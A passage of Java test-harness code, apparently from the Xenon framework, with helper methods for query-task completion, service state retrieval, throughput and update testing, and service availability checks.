(RuntimeException e) {\n            // throw original exception\n            throw ExceptionTestUtils.throwAsUnchecked(e.getSuppressed()[0]);\n        }\n\n        if (isDirect) {\n            taskResult.results = result.results;\n            taskResult.taskInfo.durationMicros = result.results.queryTimeMicros;\n        }\n\n        return UriUtils.extendUri(factoryUri, create.documentSelfLink);\n    }\n\n    public QueryTask waitForQueryTaskCompletion(QuerySpecification q, int totalDocuments,\n            int versionCount, URI u, boolean forceRemote, boolean deleteOnFinish) {\n        return waitForQueryTaskCompletion(q, totalDocuments, versionCount, u, forceRemote,\n                deleteOnFinish, true);\n    }\n\n    public boolean isOwner(String documentSelfLink, String nodeSelector) {\n        final boolean[] isOwner = new boolean[1];\n        log(\"Selecting owner for %s on %s\", documentSelfLink, nodeSelector);\n        TestContext ctx = this.testCreate(1);\n        Operation op = Operation\n                .createPost(null)\n                .setExpiration(Utils.fromNowMicrosUtc(TimeUnit.SECONDS.toMicros(10)))\n                .setCompletion((o, e) -> {\n                    if (e != null) {\n                        ctx.failIteration(e);\n                        return;\n                    }\n\n                    NodeSelectorService.SelectOwnerResponse rsp =\n                            o.getBody(NodeSelectorService.SelectOwnerResponse.class);\n                    log(\"Is owner: %s for %s\", rsp.isLocalHostOwner, rsp.key);\n                    isOwner[0] = rsp.isLocalHostOwner;\n                    ctx.completeIteration();\n                });\n        this.selectOwner(nodeSelector, documentSelfLink, op);\n        ctx.await();\n\n        return isOwner[0];\n    }\n\n    public QueryTask waitForQueryTaskCompletion(QuerySpecification q, int totalDocuments,\n            int versionCount, URI u, boolean forceRemote, boolean deleteOnFinish,\n            boolean throwOnFailure) {\n\n        long startNanos = System.nanoTime();\n        if (q.options == null) {\n            q.options = EnumSet.noneOf(QueryOption.class);\n        }\n\n        EnumSet<TestProperty> props = EnumSet.noneOf(TestProperty.class);\n        if (forceRemote) {\n            props.add(TestProperty.FORCE_REMOTE);\n        }\n        waitFor(\"Query did not complete in time\", () -> {\n            QueryTask taskState = getServiceState(props, QueryTask.class, u);\n            return taskState.taskInfo.stage == TaskState.TaskStage.FINISHED\n                    || taskState.taskInfo.stage == TaskState.TaskStage.FAILED\n                    || taskState.taskInfo.stage == TaskState.TaskStage.CANCELLED;\n        });\n\n        QueryTask latestTaskState = getServiceState(props, QueryTask.class, u);\n\n        // Throw if task was expected to be successful\n        if (throwOnFailure && (latestTaskState.taskInfo.stage == TaskState.TaskStage.FAILED)) {\n            throw new IllegalStateException(Utils.toJsonHtml(latestTaskState.taskInfo.failure));\n        }\n\n        if (totalDocuments * versionCount > 1) {\n            long endNanos = System.nanoTime();\n            double deltaSeconds = endNanos - startNanos;\n            deltaSeconds /= TimeUnit.SECONDS.toNanos(1);\n            double thpt = totalDocuments / deltaSeconds;\n            log(\"Options: %s.  Throughput (documents / sec): %f\", q.options.toString(), thpt);\n        }\n\n        // Delete task, if not direct\n        if (latestTaskState.taskInfo.isDirect) {\n            return latestTaskState;\n        }\n\n        if (deleteOnFinish) {\n            send(Operation.createDelete(u).setBody(new ServiceDocument()));\n        }\n\n        return latestTaskState;\n    }\n\n    public ServiceDocumentQueryResult createAndWaitSimpleDirectQuery(\n            String fieldName, String fieldValue, long documentCount, long expectedResultCount,\n            TestResults testResults) {\n        return createAndWaitSimpleDirectQuery(this.getUri(), fieldName, fieldValue, documentCount,\n                expectedResultCount, testResults);\n    }\n\n    public ServiceDocumentQueryResult createAndWaitSimpleDirectQuery(\n            String fieldName, String fieldValue, long documentCount, long expectedResultCount) {\n        return createAndWaitSimpleDirectQuery(fieldName, fieldValue, documentCount,\n                expectedResultCount, null);\n    }\n\n    public ServiceDocumentQueryResult createAndWaitSimpleDirectQuery(URI hostUri,\n            String fieldName, String fieldValue, long documentCount, long expectedResultCount) {\n        return createAndWaitSimpleDirectQuery(hostUri, fieldName, fieldValue,\n                documentCount, expectedResultCount, null);\n    }\n\n    public ServiceDocumentQueryResult createAndWaitSimpleDirectQuery(URI hostUri,\n            String fieldName, String fieldValue, long documentCount, long expectedResultCount,\n            TestResults testResults) {\n        QueryTask.QuerySpecification q = new QueryTask.QuerySpecification();\n        q.query.setTermPropertyName(fieldName).setTermMatchValue(fieldValue);\n        return createAndWaitSimpleDirectQuery(hostUri, q,\n                documentCount, expectedResultCount, testResults);\n    }\n\n    public ServiceDocumentQueryResult createAndWaitSimpleDirectQuery(\n            QueryTask.QuerySpecification spec,\n            long documentCount, long expectedResultCount) {\n        return createAndWaitSimpleDirectQuery(spec,\n                documentCount, expectedResultCount, null);\n    }\n\n    public ServiceDocumentQueryResult createAndWaitSimpleDirectQuery(\n            QuerySpecification spec,\n            long documentCount, long expectedResultCount, TestResults testResults) {\n        return createAndWaitSimpleDirectQuery(this.getUri(), spec,\n                documentCount, expectedResultCount, testResults);\n    }\n\n    public ServiceDocumentQueryResult createAndWaitSimpleDirectQuery(URI hostUri,\n            QuerySpecification spec, long documentCount, long expectedResultCount, TestResults testResults) {\n        long start = System.nanoTime() / 1000;\n\n        QueryTask[] tasks = new QueryTask[1];\n        waitFor(\"\", () -> {\n            QueryTask task = QueryTask.create(spec).setDirect(true);\n            createQueryTaskService(UriUtils.buildUri(hostUri, ServiceUriPaths.CORE_QUERY_TASKS),\n                    task, false, true, task, null);\n            if (spec.resultLimit != null) {\n                task = getServiceState(null,\n                        QueryTask.class,\n                        UriUtils.buildUri(hostUri, task.results.nextPageLink));\n            }\n            if (task.results.documentLinks.size() == expectedResultCount) {\n                tasks[0] = task;\n                return true;\n            }\n            log(\"Expected %d, got %d, Query task: %s\", expectedResultCount,\n                    task.results.documentLinks.size(), task);\n            return false;\n        });\n\n        QueryTask resultTask = tasks[0];\n\n        assertTrue(\n                String.format(\"Got %d links, expected %d\", resultTask.results.documentLinks.size(),\n                        expectedResultCount),\n                resultTask.results.documentLinks.size() == expectedResultCount);\n        long end = System.nanoTime() / 1000;\n        double delta = (end - start) / 1000000.0;\n        double thpt = documentCount / delta;\n        log(\"Document count: %d, Expected match count: %d, Documents / sec: %f\",\n                documentCount, expectedResultCount, thpt);\n\n        if (testResults != null) {\n            String key = spec.query.term.propertyName + \" docs/s\";\n            testResults.getReport().all(key, thpt);\n        }\n        return resultTask.results;\n    }\n\n    public void validatePermanentServiceDocumentDeletion(String linkPrefix, long count,\n            boolean failOnMismatch)\n            throws Throwable {\n        long start = Utils.getNowMicrosUtc();\n\n        while (Utils.getNowMicrosUtc() - start < this.getOperationTimeoutMicros()) {\n            QueryTask.QuerySpecification q = new QueryTask.QuerySpecification();\n            q.query = new QueryTask.Query()\n                    .setTermPropertyName(ServiceDocument.FIELD_NAME_SELF_LINK)\n                    .setTermMatchType(MatchType.WILDCARD)\n                    .setTermMatchValue(linkPrefix + UriUtils.URI_WILDCARD_CHAR);\n\n            URI u = createQueryTaskService(QueryTask.create(q), false);\n            QueryTask finishedTaskState = waitForQueryTaskCompletion(q,\n                    (int) count, (int) count, u, false, true);\n            if (finishedTaskState.results.documentLinks.size() == count) {\n                return;\n            }\n            log(\"got %d links back, expected %d: %s\",\n                    finishedTaskState.results.documentLinks.size(), count,\n                    Utils.toJsonHtml(finishedTaskState));\n\n            if (!failOnMismatch) {\n                return;\n            }\n            Thread.sleep(100);\n        }\n        if (failOnMismatch) {\n            throw new TimeoutException();\n        }\n    }\n\n    public String sendHttpRequest(ServiceClient client, String uri, String requestBody, int count) {\n\n        Object[] rspBody = new Object[1];\n        TestContext ctx = testCreate(count);\n        Operation op = Operation.createGet(URI.create(uri)).setCompletion(\n                (o, e) -> {\n                    if (e != null) {\n                        ctx.failIteration(e);\n                        return;\n                    }\n                    rspBody[0] = o.getBodyRaw();\n                    ctx.completeIteration();\n                });\n\n        if (requestBody != null) {\n            op.setAction(Action.POST).setBody(requestBody);\n        }\n\n        op.setExpiration(Utils.fromNowMicrosUtc(getOperationTimeoutMicros()));\n        op.setReferer(getReferer());\n        ServiceClient c = client != null ? client : getClient();\n        for (int i = 0; i < count; i++) {\n            c.send(op);\n        }\n        ctx.await();\n\n        String htmlResponse = (String) rspBody[0];\n        return htmlResponse;\n    }\n\n    public Operation sendUIHttpRequest(String uri, String requestBody, int count) {\n        Operation op = Operation.createGet(URI.create(uri));\n        List<Operation> ops = new ArrayList<>();\n        for (int i = 0; i < count; i++) {\n            ops.add(op);\n        }\n        List<Operation> responses = this.sender.sendAndWait(ops);\n        return responses.get(0);\n    }\n\n    public <T extends ServiceDocument> T getServiceState(EnumSet<TestProperty> props, Class<T> type,\n            URI uri) {\n        Map<URI, T> r = getServiceState(props, type, new URI[] { uri });\n        return r.values().iterator().next();\n    }\n\n    public <T extends ServiceDocument> Map<URI, T> getServiceState(EnumSet<TestProperty> props,\n            Class<T> type,\n            Collection<URI> uris) {\n        URI[] array = new URI[uris.size()];\n        int i = 0;\n        for (URI u : uris) {\n            array[i++] = u;\n        }\n        return getServiceState(props, type, array);\n    }\n\n    public <T extends TaskService.TaskServiceState> T getServiceStateUsingQueryTask(\n            Class<T> type, String uri) {\n        QueryTask.Query q = QueryTask.Query.Builder.create()\n                .setTerm(ServiceDocument.FIELD_NAME_SELF_LINK, uri)\n                .build();\n\n        QueryTask queryTask = new QueryTask();\n        queryTask.querySpec = new QueryTask.QuerySpecification();\n        queryTask.querySpec.query = q;\n        queryTask.querySpec.options.add(QueryOption.EXPAND_CONTENT);\n\n        this.createQueryTaskService(null, queryTask, false, true, queryTask, null);\n        return Utils.fromJson(queryTask.results.documents.get(uri), type);\n    }\n\n    /**\n     * Retrieve in parallel, state from N services. This method will block execution until responses\n     * are received or a failure occurs. It is not optimized for throughput measurements\n     *\n     * @param type\n     * @param uris\n     */\n    public <T extends ServiceDocument> Map<URI, T> getServiceState(EnumSet<TestProperty> props,\n            Class<T> type, URI... uris) {\n\n        if (type == null) {\n            throw new IllegalArgumentException(\"type is required\");\n        }\n\n        if (uris == null || uris.length == 0) {\n            throw new IllegalArgumentException(\"uris are required\");\n        }\n\n        List<Operation> ops = new ArrayList<>();\n        for (URI u : uris) {\n            Operation get = Operation.createGet(u).setReferer(getReferer());\n            if (props != null && props.contains(TestProperty.FORCE_REMOTE)) {\n                get.forceRemote();\n            }\n            if (props != null && props.contains(TestProperty.HTTP2)) {\n                get.setConnectionSharing(true);\n            }\n\n            if (props != null && props.contains(TestProperty.DISABLE_CONTEXT_ID_VALIDATION)) {\n                get.setContextId(TestProperty.DISABLE_CONTEXT_ID_VALIDATION.toString());\n            }\n\n            ops.add(get);\n        }\n\n        Map<URI, T> results = new HashMap<>();\n\n        List<Operation> responses = this.sender.sendAndWait(ops);\n        for (Operation response : responses) {\n            T doc = response.getBody(type);\n            results.put(UriUtils.buildUri(response.getUri(), doc.documentSelfLink), doc);\n        }\n\n        return results;\n    }\n\n    /**\n     * Retrieve in parallel, state from N services. This method will block execution until responses\n     * are received or a failure occurs. It is not optimized for throughput measurements\n     */\n    public <T extends ServiceDocument> Map<URI, T> getServiceState(EnumSet<TestProperty> props,\n            Class<T> type,\n            List<Service> services) {\n        URI[] uris = new URI[services.size()];\n        int i = 0;\n        for (Service s : services) {\n            uris[i++] = s.getUri();\n        }\n        return this.getServiceState(props, type, uris);\n    }\n\n    public ServiceDocumentQueryResult getFactoryState(URI factoryUri) {\n        return this.getServiceState(null, ServiceDocumentQueryResult.class, factoryUri);\n    }\n\n    public ServiceDocumentQueryResult getExpandedFactoryState(URI factoryUri) {\n        factoryUri = UriUtils.buildExpandLinksQueryUri(factoryUri);\n        return this.getServiceState(null, ServiceDocumentQueryResult.class, factoryUri);\n    }\n\n    public Map<String, ServiceStat> getServiceStats(URI serviceUri) {\n        ServiceStats stats = this.sender.sendStatsGetAndWait(serviceUri);\n        return stats.entries;\n    }\n\n    public void doExampleServiceUpdateAndQueryByVersion(URI hostUri, int serviceCount) {\n        Consumer<Operation> bodySetter = (o) -> {\n            ExampleServiceState s = new ExampleServiceState();\n            s.name = UUID.randomUUID().toString();\n            o.setBody(s);\n        };\n        Map<URI, ExampleServiceState> services = doFactoryChildServiceStart(null,\n                serviceCount,\n                ExampleServiceState.class, bodySetter,\n                UriUtils.buildUri(hostUri, ExampleService.FACTORY_LINK));\n\n        Map<URI, ExampleServiceState> statesBeforeUpdate = getServiceState(null,\n                ExampleServiceState.class, services.keySet());\n\n        for (ExampleServiceState state : statesBeforeUpdate.values()) {\n            assertEquals(state.documentVersion, 0);\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.POST, 0L,\n                    0L);\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.POST, null,\n                    0L);\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.POST, 1L,\n                    null);\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.POST, 10L,\n                    null);\n        }\n\n        ExampleServiceState body = new ExampleServiceState();\n        body.name = UUID.randomUUID().toString();\n        doServiceUpdates(services.keySet(), Action.PUT, body);\n        Map<URI, ExampleServiceState> statesAfterPut = getServiceState(null,\n                ExampleServiceState.class, services.keySet());\n\n        for (ExampleServiceState state : statesAfterPut.values()) {\n            assertEquals(state.documentVersion, 1);\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.POST, 0L,\n                    0L);\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.PUT, 1L,\n                    1L);\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.PUT, null,\n                    1L);\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.PUT, 10L,\n                    null);\n        }\n\n        doServiceUpdates(services.keySet(), Action.DELETE, body);\n\n        for (ExampleServiceState state : statesAfterPut.values()) {\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.POST, 0L,\n                    0L);\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.PUT, 1L,\n                    1L);\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.DELETE, 2L,\n                    2L);\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.DELETE,\n                    null, 2L);\n            queryDocumentIndexByVersionAndVerify(hostUri, state.documentSelfLink, Action.DELETE,\n                    10L, null);\n        }\n    }\n\n    public void doServiceUpdates(Collection<URI> serviceUris, Action action,\n            ServiceDocument body) {\n        List<Operation> ops = new ArrayList<>();\n        for (URI u : serviceUris) {\n            Operation update = Operation.createPost(u)\n                    .setAction(action)\n                    .setBody(body);\n            ops.add(update);\n        }\n        this.sender.sendAndWait(ops);\n    }\n\n    private void queryDocumentIndexByVersionAndVerify(URI hostUri, String selfLink,\n            Action expectedAction,\n            Long version,\n            Long latestVersion) {\n\n        URI localQueryUri = UriUtils.buildDefaultDocumentQueryUri(\n                hostUri,\n                selfLink,\n                false,\n                true,\n                ServiceOption.PERSISTENCE);\n\n        if (version != null) {\n            localQueryUri = UriUtils.appendQueryParam(localQueryUri,\n                    ServiceDocument.FIELD_NAME_VERSION,\n                    Long.toString(version));\n        }\n\n        Operation remoteGet = Operation.createGet(localQueryUri);\n        Operation result = this.sender.sendAndWait(remoteGet);\n        if (latestVersion == null) {\n            assertFalse(\"Document not expected\", result.hasBody());\n            return;\n        }\n\n        ServiceDocument doc = result.getBody(ServiceDocument.class);\n        int expectedVersion = version == null ? latestVersion.intValue() : version.intValue();\n        assertEquals(\"Invalid document version returned\", doc.documentVersion, expectedVersion);\n\n        String action = doc.documentUpdateAction;\n        assertEquals(\"Invalid document update action returned:\" + action, expectedAction.name(),\n                action);\n\n    }\n\n    public <T> double doPutPerService(List<Service> services)\n            throws Throwable {\n        return doPutPerService(EnumSet.noneOf(TestProperty.class), services);\n    }\n\n    public <T> double doPutPerService(EnumSet<TestProperty> properties,\n            List<Service> services) throws Throwable {\n        return doPutPerService(computeIterationsFromMemory(properties, services.size()),\n                properties,\n                services);\n    }\n\n    public <T> double doPatchPerService(long count,\n            EnumSet<TestProperty> properties,\n            List<Service> services) throws Throwable {\n        return doServiceUpdates(Action.PATCH, count, properties, services);\n    }\n\n    public <T> double doPutPerService(long count, EnumSet<TestProperty> properties,\n            List<Service> services) throws Throwable {\n        return doServiceUpdates(Action.PUT, count, properties, services);\n    }\n\n    public double doServiceUpdates(Action action, long count,\n            EnumSet<TestProperty> properties,\n            List<Service> services) throws Throwable {\n\n        if (properties == null) {\n            properties = EnumSet.noneOf(TestProperty.class);\n        }\n\n        logMemoryInfo();\n        StackTraceElement[] e = new Exception().getStackTrace();\n        String testName = String.format(\n                \"Parent: %s, %s test with properties %s, service caps: %s\",\n                e[1].getMethodName(),\n                action, properties.toString(), services.get(0).getOptions());\n\n        Map<URI, MinimalTestServiceState> statesBeforeUpdate = getServiceState(properties,\n                MinimalTestServiceState.class, services);\n\n        long startTimeMicros = System.nanoTime() / 1000;\n        TestContext ctx = testCreate(count * services.size());\n        ctx.setTestName(testName);\n        ctx.logBefore();\n\n        // create a template PUT. Each operation instance is cloned on send, so\n        // we can re-use across services\n        Operation updateOp = Operation.createPut(null).setCompletion(ctx.getCompletion());\n\n        updateOp.setAction(action);\n\n        if (properties.contains(TestProperty.FORCE_REMOTE)) {\n            updateOp.forceRemote();\n        }\n        MinimalTestServiceState body = (MinimalTestServiceState) buildMinimalTestState();\n        byte[] binaryBody = null;\n\n        // put random values in core document properties to verify they are\n        // ignored\n        if (!this.isStressTest()) {\n            body.documentSelfLink = UUID.randomUUID().toString();\n            body.documentKind = UUID.randomUUID().toString();\n        } else {\n            body.stringValue = UUID.randomUUID().toString();\n            body.id = UUID.randomUUID().toString();\n            body.responseDelay = 10;\n            body.documentVersion = 10;\n            body.documentEpoch = 10L;\n            body.documentOwner = UUID.randomUUID().toString();\n        }\n\n        if (properties.contains(TestProperty.SET_EXPIRATION)) {\n            // set expiration to the maintenance interval, which should already be very small\n            // when the caller sets this test property\n            body.documentExpirationTimeMicros = Utils.fromNowMicrosUtc(\n                    +this.getMaintenanceIntervalMicros());\n        }\n\n        final int maxByteCount = 256 * 1024;\n        if (properties.contains(TestProperty.LARGE_PAYLOAD)) {\n            Random r = new Random();\n            int byteCount = getClient().getRequestPayloadSizeLimit() / 4;\n            if (properties.contains(TestProperty.BINARY_PAYLOAD)) {\n                if (properties.contains(TestProperty.FORCE_FAILURE)) {\n                    byteCount = getClient().getRequestPayloadSizeLimit() * 2;\n                } else {\n                    // make sure we do not blow memory if max request size is high\n                    byteCount = Math.min(maxByteCount, byteCount);\n                }\n            } else {\n                byteCount = maxByteCount;\n            }\n            byte[] data = new byte[byteCount];\n            r.nextBytes(data);\n            if (properties.contains(TestProperty.BINARY_PAYLOAD)) {\n                binaryBody = data;\n            } else {\n                body.stringValue = printBase64Binary(data);\n            }\n        }\n\n        if (properties.contains(TestProperty.HTTP2)) {\n            updateOp.setConnectionSharing(true);\n        }\n\n        if (properties.contains(TestProperty.BINARY_PAYLOAD)) {\n            updateOp.setContentType(Operation.MEDIA_TYPE_APPLICATION_OCTET_STREAM);\n            updateOp.setCompletion((o, eb) -> {\n                if (eb != null) {\n                    ctx.fail(eb);\n                    return;\n                }\n\n                if (!Operation.MEDIA_TYPE_APPLICATION_OCTET_STREAM.equals(o.getContentType())) {\n                    ctx.fail(new IllegalArgumentException(\"unexpected content type: \"\n                            + o.getContentType()));\n                    return;\n                }\n                ctx.complete();\n            });\n\n        }\n\n        boolean isFailureExpected = false;\n        if (properties.contains(TestProperty.FORCE_FAILURE)\n                || properties.contains(TestProperty.EXPECT_FAILURE)) {\n            toggleNegativeTestMode(true);\n            isFailureExpected = true;\n\n            if (properties.contains(TestProperty.LARGE_PAYLOAD)) {\n                updateOp.setCompletion((o, ex) -> {\n                    if (ex == null) {\n                        ctx.fail(new IllegalStateException(\"expected failure\"));\n                    } else {\n                        ctx.complete();\n                    }\n                });\n            } else {\n                updateOp.setCompletion((o, ex) -> {\n                    if (ex == null) {\n                        ctx.fail(new IllegalStateException(\"failure expected\"));\n                        return;\n                    }\n\n                    MinimalTestServiceErrorResponse rsp = o\n                            .getBody(MinimalTestServiceErrorResponse.class);\n                    if (!MinimalTestServiceErrorResponse.KIND.equals(rsp.documentKind)) {\n                        ctx.fail(new IllegalStateException(\"Response not expected:\"\n                                + Utils.toJson(rsp)));\n                        return;\n                    }\n                    ctx.complete();\n                });\n            }\n        }\n\n        int byteCount = Utils.toJson(body).getBytes(Utils.CHARSET).length;\n        if (properties.contains(TestProperty.BINARY_SERIALIZATION)) {\n            long c = KryoSerializers.serializeDocument(body, 4096).position();\n            byteCount = (int) c;\n        }\n        log(\"Bytes per payload %s\", byteCount);\n\n        boolean isConcurrentSend = properties.contains(TestProperty.CONCURRENT_SEND);\n        final boolean isFailureExpectedFinal = isFailureExpected;\n\n        for (Service s : services) {\n            if (properties.contains(TestProperty.FORCE_REMOTE)) {\n                updateOp.setConnectionTag(this.connectionTag);\n            }\n\n            long[] expectedVersion = new long[1];\n            if (s.hasOption(ServiceOption.STRICT_UPDATE_CHECKING)) {\n                // we have to serialize requests and properly set version to match expected current\n                // version\n                MinimalTestServiceState initialState = statesBeforeUpdate.get(s.getUri());\n                expectedVersion[0] = isFailureExpected ? Integer.MAX_VALUE\n                        : initialState.documentVersion;\n            }\n\n            URI sUri = s.getUri();\n            updateOp.setUri(sUri);\n\n            for (int i = 0; i < count; i++) {\n                if (!isFailureExpected) {\n                    body.id = \"\" + i;\n                } else if (!properties.contains(TestProperty.LARGE_PAYLOAD)) {\n                    body.id = null;\n                }\n\n                CountDownLatch[] l = new CountDownLatch[1];\n                if (s.hasOption(ServiceOption.STRICT_UPDATE_CHECKING)) {\n                    // only used for strict update checking, serialized requests\n                    l[0] = new CountDownLatch(1);\n                    // we have to serialize requests and properly set version\n                    body.documentVersion = expectedVersion[0];\n                    updateOp.setCompletion((o, ex) -> {\n                        if (ex == null || isFailureExpectedFinal) {\n                            MinimalTestServiceState rsp = o.getBody(MinimalTestServiceState.class);\n                            expectedVersion[0] = rsp.documentVersion;\n                            ctx.complete();\n                            l[0].countDown();\n                            return;\n                        }\n                        ctx.fail(ex);\n                        l[0].countDown();\n                    });\n                }\n\n                Object b = binaryBody != null ? binaryBody : body;\n                if (properties.contains(TestProperty.BINARY_SERIALIZATION)) {\n                    // provide hints to runtime on how to serialize the body,\n                    // using binary serialization and a buffer size equal to content length\n                    updateOp.setContentLength(byteCount);\n                    updateOp.setContentType(Operation.MEDIA_TYPE_APPLICATION_KRYO_OCTET_STREAM);\n                }\n\n                if (isConcurrentSend) {\n                    Operation putClone = updateOp.clone();\n                    putClone.setBody(b).setUri(sUri);\n                    run(() -> {\n                        s.sendRequest(putClone);\n                    });\n                } else {\n                    s.sendRequest(updateOp.setBody(b));\n                }\n                if (s.hasOption(ServiceOption.STRICT_UPDATE_CHECKING)) {\n                    // we have to serialize requests and properly set version\n                    if (!isFailureExpected) {\n                        l[0].await();\n                    }\n                    if (this.failure != null) {\n                        throw this.failure;\n                    }\n\n                }\n            }\n        }\n\n        testWait(ctx);\n        double throughput = ctx.logAfter();\n\n        if (isFailureExpected) {\n            this.toggleNegativeTestMode(false);\n            return throughput;\n        }\n\n        if (properties.contains(TestProperty.BINARY_PAYLOAD)) {\n            return throughput;\n        }\n\n        List<URI> getUris = new ArrayList<>();\n        if (services.get(0).hasOption(ServiceOption.PERSISTENCE)) {\n            for (Service s : services) {\n                // bypass the services, which rely on caching, and go straight to the index\n                URI u = UriUtils.buildDocumentQueryUri(this, s.getSelfLink(), true, false,\n                        ServiceOption.PERSISTENCE);\n                getUris.add(u);\n\n            }\n        } else {\n            for (Service s : services) {\n                getUris.add(s.getUri());\n            }\n        }\n\n        Map<URI, MinimalTestServiceState> statesAfterUpdate = getServiceState(\n                properties,\n                MinimalTestServiceState.class, getUris);\n\n        for (MinimalTestServiceState st : statesAfterUpdate.values()) {\n            URI serviceUri = UriUtils.buildUri(this, st.documentSelfLink);\n            ServiceDocument beforeSt = statesBeforeUpdate.get(serviceUri);\n            long expectedVersion = beforeSt.documentVersion + count;\n\n            if (st.documentVersion != expectedVersion) {\n                QueryTestUtils.logVersionInfoForService(this.sender, serviceUri, expectedVersion);\n                throw new IllegalStateException(\"got \" + st.documentVersion + \", expected \"\n                        + (beforeSt.documentVersion + count));\n            }\n            assertTrue(st.documentVersion == beforeSt.documentVersion + count);\n            assertTrue(st.id != null);\n            assertTrue(st.documentSelfLink != null\n                    && st.documentSelfLink.equals(beforeSt.documentSelfLink));\n            assertTrue(st.documentKind != null\n                    && st.documentKind.equals(Utils.buildKind(MinimalTestServiceState.class)));\n            assertTrue(st.documentUpdateTimeMicros > startTimeMicros);\n            assertTrue(st.documentUpdateAction != null);\n            assertTrue(st.documentUpdateAction.equals(action.toString()));\n        }\n\n        logMemoryInfo();\n        return throughput;\n    }\n\n    public void logMemoryInfo() {\n        log(\"Memory free:%d, available:%s, total:%s\", Runtime.getRuntime().freeMemory(),\n                Runtime.getRuntime().totalMemory(),\n                Runtime.getRuntime().maxMemory());\n    }\n\n    public URI getReferer() {\n        if (this.referer == null) {\n            this.referer = getUri();\n        }\n        return this.referer;\n    }\n\n    public void waitForServiceAvailable(String... links) {\n        for (String link : links) {\n            TestContext ctx = testCreate(1);\n            this.registerForServiceAvailability(ctx.getCompletion(), link);\n            ctx.await();\n        }\n    }\n\n    public void waitForReplicatedFactoryServiceAvailable(URI u) {\n        waitForReplicatedFactoryServiceAvailable(u, ServiceUriPaths.DEFAULT_NODE_SELECTOR);\n    }\n\n    public void waitForReplicatedFactoryServiceAvailable(URI u, String nodeSelectorPath) {\n        waitFor(\"replicated available check time out for \" + u, () -> {\n            boolean[] isReady = new boolean[1];\n            TestContext ctx = testCreate(1);\n            NodeGroupUtils.checkServiceAvailability((o, e) -> {\n                if (e != null) {\n                    isReady[0] = false;\n                    ctx.completeIteration();\n                    return;\n                }\n\n                isReady[0] = true;\n                ctx.completeIteration();\n            }, this, u, nodeSelectorPath);\n            ctx.await();\n            return isReady[0];\n        });\n    }\n\n    public void waitForServiceAvailable(URI u) {\n        boolean[] isReady = new boolean[1];\n        log(\"Starting /available check on %s\", u);\n        waitFor(\"available check timeout for \" + u, () -> {\n            TestContext ctx = testCreate(1);\n            URI available = UriUtils.buildAvailableUri(u);\n            Operation get = Operation.createGet(available).setCompletion((o, e) -> {\n                if (e != null) {\n                    // not ready\n                    isReady[0] = false;\n                    ctx.completeIteration();\n                    return;\n                }\n                isReady[0] = true;\n                ctx.completeIteration();\n                return;\n            });\n            send(get);\n            ctx.await();\n\n            if (isReady[0]) {\n                log(\"%s /available returned success\", get.getUri());\n                return true;\n            }\n            return false;\n        });\n    }\n\n    public <T extends ServiceDocument> Map<URI, T> doFactoryChildServiceStart(\n            EnumSet<TestProperty> props,\n            long c,\n            Class<T> bodyType,\n            Consumer<Operation> setInitialStateConsumer,\n            URI factoryURI) {\n        Map<URI, T> initialStates = new HashMap<>();\n        if (props == null) {\n            props = EnumSet.noneOf(TestProperty.class);\n        }\n\n        log(\"Sending %d POST requests to %s\", c, factoryURI);\n\n        List<Operation> ops = new ArrayList<>();\n        for (int i = 0; i < c; i++) {\n            Operation createPost = Operation.createPost(factoryURI);\n            // call callback to set the body\n            setInitialStateConsumer.accept(createPost);\n            if (props.contains(TestProperty.FORCE_REMOTE)) {\n                createPost.forceRemote();\n            }\n\n            ops.add(createPost);\n        }\n\n        List<T> responses = this.sender.sendAndWait(ops, bodyType);\n        Map<URI, T> docByChildURI = responses.stream().collect(\n                toMap(doc -> UriUtils.buildUri(factoryURI, doc.documentSelfLink), identity()));\n        initialStates.putAll(docByChildURI);\n        log(\"Done with %d POST requests to %s\", c, factoryURI);\n        return initialStates;\n    }\n\n    public List<Service> doThroughputServiceStart(long c, Class<? extends Service> type,\n            ServiceDocument initialState,\n            EnumSet<Service.ServiceOption> options,\n            EnumSet<Service.ServiceOption> optionsToRemove) throws Throwable {\n        return doThroughputServiceStart(EnumSet.noneOf(TestProperty.class), c, type, initialState,\n                options, null);\n    }\n\n    public List<Service> doThroughputServiceStart(\n            EnumSet<TestProperty> props,\n            long c, Class<? extends Service> type,\n            ServiceDocument initialState,\n            EnumSet<Service.ServiceOption> options,\n            EnumSet<Service.ServiceOption> optionsToRemove) throws Throwable {\n        return doThroughputServiceStart(props, c, type, initialState,\n                options, optionsToRemove, null);\n    }\n\n    public List<Service> doThroughputServiceStart(\n            EnumSet<TestProperty> props,\n            long c, Class<? extends Service> type,\n            ServiceDocument initialState,\n            EnumSet<Service.ServiceOption> options,\n            EnumSet<Service.ServiceOption> optionsToRemove,\n            Long maintIntervalMicros) throws Throwable {\n\n        List<Service> services = new ArrayList<>();\n\n        TestContext ctx = testCreate((int) c);\n        for (int i = 0; i < c; i++) {\n            Service e = type.newInstance();\n            if (options != null) {\n                for (Service.ServiceOption cap : options) {\n                    e.toggleOption(cap, true);\n                }\n            }\n            if (optionsToRemove != null) {\n                for (ServiceOption opt : optionsToRemove) {\n                    e.toggleOption(opt, false);\n                }\n            }\n\n            Operation post = createServiceStartPost(ctx);\n            if (initialState != null) {\n                post.setBody(initialState);\n            }\n\n            if (props != null && props.contains(TestProperty.SET_CONTEXT_ID)) {\n                post.setContextId(TestProperty.SET_CONTEXT_ID.toString());\n            }\n\n            if (maintIntervalMicros != null) {\n                e.setMaintenanceIntervalMicros(maintIntervalMicros);\n            }\n\n            startService(post, e);\n            services.add(e);\n        }\n        ctx.await();\n        logThroughput();\n        return services;\n    }\n\n    public Service startServiceAndWait(Class<? extends Service> serviceType,\n            String uriPath)\n            throws Throwable {\n        return startServiceAndWait(serviceType.newInstance(), uriPath, null);\n    }\n\n    public Service startServiceAndWait(Service s,\n            String uriPath,\n            ServiceDocument body)\n            throws Throwable {\n        TestContext ctx = 